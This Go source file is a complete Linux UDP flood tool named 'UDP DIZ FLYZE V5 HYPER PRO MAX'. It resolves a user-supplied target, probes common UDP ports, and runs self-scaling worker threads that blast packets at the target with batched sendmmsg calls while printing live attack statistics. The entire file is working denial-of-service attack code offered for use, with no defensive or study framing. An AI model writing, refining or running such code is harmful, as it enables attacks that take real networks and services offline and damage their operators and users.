//go:build linux
// +build linux

package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

var (
	LINK      string
	RATE      int32
	duration  int
	THREAD    int
	SIZE      int
	VERSI     bool
	BANDWIT   int
	b         bool
	DYNAMIC   bool
	floodRunning atomic.Bool
	KIRIM     atomic.Uint64
	GAGAL     atomic.Uint64
	openPorts []int
	payloadPool *sync.Pool
	activeThreads atomic.Int32
)

const (
	version = "UDP DIZ FLYZE V5 HYPER PRO MAX"
	ST      = 1 * time.Second
	BC      = 2 * time.Second
	MAX_BOOST = 3.0
	BATCH_SIZE = 32
)

func init() {
	flag.StringVar(&LINK, "target", "", "LINK TARGET")
	flag.IntVar(&duration, "duration", 0, "TIME")
	flag.IntVar(&THREAD, "threads", 0, "THREAD")
	flag.IntVar(&SIZE, "size", 0, "UKURAN")
	flag.BoolVar(&VERSI, "version", false, "VERSION")
	flag.IntVar(&BANDWIT, "maxbw", 0, "MBPS")
	flag.BoolVar(&b, "b", true, "FAST MODE")
	flag.BoolVar(&DYNAMIC, "dynamic", false, "DYNAMIC PAYLOAD")
}

func main() {
	printBanner()
	flag.Parse()

	if VERSI {
		fmt.Println(version)
		os.Exit(0)
	}

	if LINK == "" {
		LINK = Logo()
	}

	IPT, err := RIP(LINK)
	if err != nil {
		fmt.Printf("\nIP Gagal di kompres : %v\n", err)
		os.Exit(1)
	}

	Config()
	CekPort(IPT)
	if len(openPorts) == 0 {
		openPorts = []int{53, 80, 8080, 123, 443, 1900, 5353, 7547, 111, 137}
	}

	payloadPool = &sync.Pool{
		New: func() interface{} {
			buf := make([]byte, SIZE)
			if DYNAMIC {
				rand.Read(buf)
			}
			return buf
		},
	}
	
	// Pre-warm payload pool
	for i := 0; i < THREAD*BATCH_SIZE*2; i++ {
		payloadPool.Put(payloadPool.New())
	}

	fmt.Printf("\n💉 LINK : %s\n", LINK)
	fmt.Printf("💉 IP : %s\n", IPT)
	fmt.Printf("💉 PORT : %v\n", openPorts)
	fmt.Printf("💉 PAYL : %d \n", SIZE)
	fmt.Printf("💉 THRD : %d\n", THREAD)
	fmt.Printf("💉 RATE : %d \n", atomic.LoadInt32(&RATE))
	fmt.Printf("💉 TIME : %d \n", duration)
	fmt.Printf("💉 MBPS : %d \n\n", BANDWIT)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	floodRunning.Store(true)
	go Status()

	if BANDWIT > 0 {
		go Bndwit()
	}
	
	activeThreads.Store(int32(THREAD))
	for i := 0; i < THREAD; i++ {
		go Worker(IPT)
	}
	
	// Thread auto-scaling
	go func() {
		for floodRunning.Load() {
			currentPPS := KIRIM.Load()
			time.Sleep(5 * time.Second)
			newPPS := KIRIM.Load()
			pps := (newPPS - currentPPS) / 5
			
			if pps < uint64(atomic.LoadInt32(&RATE))/2 {
				if activeThreads.Load() < int32(THREAD)*2 {
					activeThreads.Add(1)
					go Worker(IPT)
				}
			}
		}
	}()

	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			floodRunning.Store(false)
		})
	}

	<-sigChan
	floodRunning.Store(false)
	time.Sleep(500 * time.Millisecond)
	fmt.Println("\n[!] Attack stopped")
}

func Logo() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠂⣠⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠞⠽⠿⠟⠻⠿⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠒⠋⠉⠁⠀⠀⠀⠀⠀⠀⠈⠙⠓⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⢀⣀⣀⡀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⢠⠞⠉⠀⠀⠈⠙⢦⣴⠟⠉⠀⠀⠀⠙⣧⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⡤⠶⢤⣼⡟⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⢀⣀⣀⠀⢸⡆⢸⣷⣤⣴⣦⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⡏⣰⠿⠦⣌⣻⠀⢸⡇⣾⣻⡿⣷⠀⠀⠀⠀⠀⢀⣿⣯⣽⣷⣸⡇⠀⣿⣡⠾⠛⢷⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢿⡆⣿⡀⢾⡟⠁⢀⣸⣿⣷⡿⢿⣿⠀⣠⡤⠤⣄⠘⣿⣿⣹⣿⣿⣧⡀⠙⠓⣶⣤⣾⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠻⣞⢷⡾⠁⣰⠟⠉⠉⠿⣷⣿⠟⢺⣥⣤⣤⣼⡆⠙⠻⠿⠟⠀⠉⢻⡆⣤⣿⡞⣣⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⣿⡷⣇⠀⠀⠀⠀⣀⠀⠀⠀⠈⠉⠉⠀⠀⢀⣀⠀⠀⠀⠀⣸⡇⣼⡿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢷⡹⣄⠀⠀⠀⢻⡝⠓⠲⠤⣤⣤⠴⠚⢋⡿⠃⠀⠀⣠⡟⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠳⣝⣦⣀⠀⠀⠙⢶⣞⠉⠙⠋⠉⣹⡟⠁⢀⣠⣴⣿⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠛⠛⠻⠦⠴⣦⣌⠙⠒⠛⣋⣽⠷⠞⠋⠉⠀⠀⠹⣦⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠀⠀⠀⠹⡆
⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⡷
⠀⠀⠀⠀⠀⢀⣾⠁⠀⠀⠀⠀⢠⡀⣠⡶⠖⠒⠒⠒⠒⠲⠦⣀⠀⠰⣤⠀⠀⠀⠀⠀⢳⡄⠀⠀⠀⠀⠀⢠⡿⠀⠀⠀⣴⠇
⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⡿⢰⠏⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⢸⣧⠀⠀⠀⠀⠀⢻⡀⠀⠀⢀⣴⠟⠁⠀⢀⣼⠋⠀
⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⢰⠇⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⣸⠋⣧⠀⠀⠀⠀⠸⣇⣠⡶⠋⠁⠀⠀⣠⡾⠁⠀⠀
⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⡀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠇⠀⣹⡄⠀⠀⠀⠀⣿⠁⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠛⠛⢯⡇⠀⠀⠀⠀⣿⣧⠤⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⡀⠈⠛⠲⣦⡤⠤⠤⢶⣞⠋⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⣷⣠⠴⠛⠋⠳⣦⣀⣀⣈⡿⠦⣄⣀⢀⣿⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⢰⡖⠒⣿⡙⢧⡀⠀⠀⠀⠈⠉⠁⢀⡴⠋⢉⣿⠿⣤⡄⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⢶⠚⣿⢷⠟⢿⡟⠾⠃⠀⠘⢷⣌⣻⡄⠀⠀⠀⠀⢠⣟⣁⣠⠞⠁⠀⢸⣧⠴⢻⣾⢿⡷⠴⢤⡄⠀⠀⠀⠀⠀⠀⠀
⢸⣟⣭⢽⡏⠀⠀⠀⠀⠀⠀⢀⠀⠘⣿⠉⣿⠀⠀⠀⠀⣿⠋⢹⠋⢠⡄⠀⠀⠀⠀⠈⠁⢸⡿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠘⢾⡇⠸⣇⠀⢠⡄⠰⣄⠀⠘⣿⡶⡯⠴⠋⠀⠀⠀⠀⠻⢧⣬⣷⣿⠃⠀⣴⠀⠀⣦⢀⣾⠃⠈⣿⠆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠋⠉⠓⠚⠳⠶⠛⠷⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠶⠶⠿⠒⠚⠛⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
` + version + `
⼳ : `)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func printBanner() {
	fmt.Print("\033[H\033[2J")
}

func RIP(target string) (string, error) {
	if strings.Contains(target, "://") {
		u, err := url.Parse(target)
		if err != nil {
			return "", err
		}
		target = u.Hostname()
	}

	if ip := net.ParseIP(target); ip != nil {
		return target, nil
	}

	ips, err := net.LookupIP(target)
	if err != nil {
		return "", err
	}

	for _, ip := range ips {
		if ipv4 := ip.To4(); ipv4 != nil {
			return ipv4.String(), nil
		}
	}
	
	if len(ips) > 0 {
		return ips[0].String(), nil
	}
	
	return "", fmt.Errorf("no IP found")
}

func Config() {
	numCPU := runtime.NumCPU()
	memStats := &runtime.MemStats{}
	runtime.ReadMemStats(memStats)
	totalMemMB := int(memStats.Sys / (1024 * 1024))

	fmt.Printf("\nCPU : %d CORES\nRAM : %d MB\n", numCPU, totalMemMB)

	if THREAD == 0 {
		THREAD = numCPU * 8
		if totalMemMB < 2048 {
			THREAD = numCPU * 4
		}
	}

	if SIZE == 0 {
		SIZE = 1472
		if totalMemMB < 2048 {
			SIZE = 1024
		}
	}

	baseRate := 25000
	if numCPU < 4 {
		baseRate = 15000
	}

	rate := baseRate * THREAD
	if BANDWIT > 0 {
		maxRate := (BANDWIT * 1000000) / (SIZE * 8)
		if rate > maxRate {
			rate = maxRate
		}
	}
	atomic.StoreInt32(&RATE, int32(rate))
}

func CekPort(IPT string) {
	commonPorts := []int{
		53, 67, 68, 69, 80, 8080, 123, 137, 138, 161, 
		500, 514, 520, 1900, 4500, 5353, 11211, 7547, 
		111, 22, 443, 8443, 1194, 5060, 33434,
	}
	results := make(chan int, len(commonPorts))
	timeout := time.After(2 * time.Second)

	portChecker := func(port int) {
		target := fmt.Sprintf("%s:%d", IPT, port)
		conn, err := net.DialTimeout("udp", target, 500*time.Millisecond)
		if err == nil {
			conn.Close()
			results <- port
		} else {
			results <- 0
		}
	}

	for _, port := range commonPorts {
		go portChecker(port)
	}

	for i := 0; i < len(commonPorts); i++ {
		select {
		case port := <-results:
			if port != 0 {
				openPorts = append(openPorts, port)
			}
		case <-timeout:
			return
		}
	}
}

func ipToBytes(ipStr string) [4]byte {
	ip := net.ParseIP(ipStr).To4()
	return [4]byte{ip[0], ip[1], ip[2], ip[3]}
}

func Worker(IPT string) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	
	conn, err := net.ListenPacket("udp", ":0")
	if err != nil {
		return
	}
	defer conn.Close()
	
	rawConn, _ := conn.(*net.UDPConn).SyscallConn()
	var rawFd int
	rawConn.Control(func(fd uintptr) {
		rawFd = int(fd)
	})
	
	// Set socket options using unix constants
	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_REUSEADDR, 1)
	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_REUSEPORT, 1)
	unix.SetsockoptInt(rawFd, unix.SOL_IP, unix.IP_MTU_DISCOVER, unix.IP_PMTUDISC_DONT)
	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_SNDBUF, 1024*1024)

	ipBytes := ipToBytes(IPT)
	
	// Pre-calculate addresses
	addrs := make([]unix.SockaddrInet4, len(openPorts))
	for i, port := range openPorts {
		addrs[i] = unix.SockaddrInet4{
			Port: port,
			Addr: ipBytes,
		}
	}
	
	// Local random source
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	
	for floodRunning.Load() {
		start := time.Now()
		sent := 0
		rate := int(atomic.LoadInt32(&RATE)) / int(activeThreads.Load())

		for sent < rate || b {
			toSend := BATCH_SIZE
			if !b && sent+toSend > rate {
				toSend = rate - sent
			}

			// Prepare batch
			msgs := make([]unix.Mmsghdr, toSend)
			iovecs := make([]unix.Iovec, toSend)
			payloads := make([][]byte, toSend)

			for i := 0; i < toSend; i++ {
				payload := payloadPool.Get().([]byte)
				if DYNAMIC {
					r.Read(payload)
				}
				payloads[i] = payload

				iovecs[i] = unix.Iovec{
					Base: &payload[0],
					Len:  uint64(len(payload)),
				}

				addr := &addrs[r.Intn(len(addrs))]
				msgs[i] = unix.Mmsghdr{
					MsgHdr: unix.Msghdr{
						Name:    (*byte)(unsafe.Pointer(addr)),
						Namelen: uint32(unsafe.Sizeof(*addr)),
						Iov:     &iovecs[i],
						Iovlen:  1,
					},
				}
			}

			// Send batch using unix.Sendmmsg
			n, err := unix.Sendmmsg(rawFd, msgs, 0)
			if err != nil {
				GAGAL.Add(uint64(toSend))
			} else {
				KIRIM.Add(uint64(n))
				if n < toSend {
					GAGAL.Add(uint64(toSend - n))
				}
			}

			// Return payloads to pool
			for _, p := range payloads {
				payloadPool.Put(p)
			}

			sent += toSend
			
			if !floodRunning.Load() {
				return
			}
		}

		elapsed := time.Since(start)
		if elapsed < time.Second && !b {
			time.Sleep(time.Second - elapsed)
		}
	}
}

func Bndwit() {
	const (
		threshold = 0.85
		adjustFactor = 0.15
	)
	
	lastTotal := KIRIM.Load()
	lastTime := time.Now()

	for floodRunning.Load() {
		time.Sleep(BC)
		
		currentTotal := KIRIM.Load()
		now := time.Now()
		elapsed := now.Sub(lastTime).Seconds()
		lastTime = now

		currentBW := float64(currentTotal-lastTotal) * float64(SIZE) * 8 / 1000000 / elapsed
		lastTotal = currentTotal

		currentRate := atomic.LoadInt32(&RATE)
		newRate := currentRate

		if BANDWIT > 0 {
			target := float64(BANDWIT)
			if currentBW > target*threshold {
				newRate = int32(float64(currentRate) * (1 - adjustFactor))
			} else if currentBW < target*(threshold-adjustFactor) {
				boost := 1 + adjustFactor
				if currentBW < target*0.5 {
					boost = MAX_BOOST
				}
				newRate = int32(float64(currentRate) * boost)
			}
			
			// Ensure minimum rate
			if newRate < 1000 {
				newRate = 1000
			}
		}

		if newRate != currentRate {
			atomic.StoreInt32(&RATE, newRate)
		}
	}
}

func Status() {
	start := time.Now()
	var lastSent uint64
	lastTime := start

	for floodRunning.Load() {
		time.Sleep(1 * time.Second)
		current := KIRIM.Load()
		now := time.Now()
		elapsed := now.Sub(lastTime).Seconds()
		PPS := float64(current-lastSent) / elapsed
		TTE := now.Sub(start).Seconds()
		bytesSent := float64(current * uint64(SIZE))
		BANDWIDTH := (bytesSent * 8 / 1000000) / TTE
		
		fmt.Printf("\r🚀%d 🎁%.0f 📤%.2f 🧭%.0fs Thr:%d", 
			current, PPS, BANDWIDTH, TTE, activeThreads.Load())
		
		lastSent = current
		lastTime = now
	}

	TTE := time.Since(start).Seconds()
	total := KIRIM.Load()
	PPS := float64(total) / TTE
	bytesSent := float64(total * uint64(SIZE))
	BANDWIDTH := (bytesSent * 8 / 1000000) / TTE

	fmt.Printf("\n\n[+] Attack finished")
	fmt.Printf("\nTotal packets: %d", total)
	fmt.Printf("\nFailed packets: %d", GAGAL.Load())
	fmt.Printf("\nAverage PPS: %.0f", PPS)
	fmt.Printf("\nAverage bandwidth: %.2f Mbps", BANDWIDTH)
	fmt.Printf("\nDuration: %.2f seconds\n", TTE)
}
